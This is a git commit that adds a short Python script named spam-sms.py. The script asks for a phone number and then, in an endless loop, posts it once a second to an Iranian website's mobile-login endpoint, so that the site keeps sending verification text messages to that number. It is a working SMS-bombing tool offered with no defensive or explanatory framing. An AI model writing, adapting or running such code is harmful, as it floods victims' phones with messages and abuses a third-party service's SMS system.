40da3b6492268fa385e2726dd30ba4d595d5fcc1
PG-Web <82887215+PG-Web-youtube@users.noreply.github.com>
2021-05-19 13:00:12 +0430

    Add files via upload

---
+++ spam-sms.py
@@ -0,0 +1,12 @@
+import requests
+import time
+phonenum = input("Enter The Phone Number :")
+
+urlsend = "https://www.shab.ir/api/fa/sandbox/v_1_4/auth/enter-mobile"
+mydata = {"mobile":"+98"+phonenum} 
+
+while True :
+     requests.post(urlsend,data=mydata)
+     print("Sent")
+     time.sleep(1)
+    
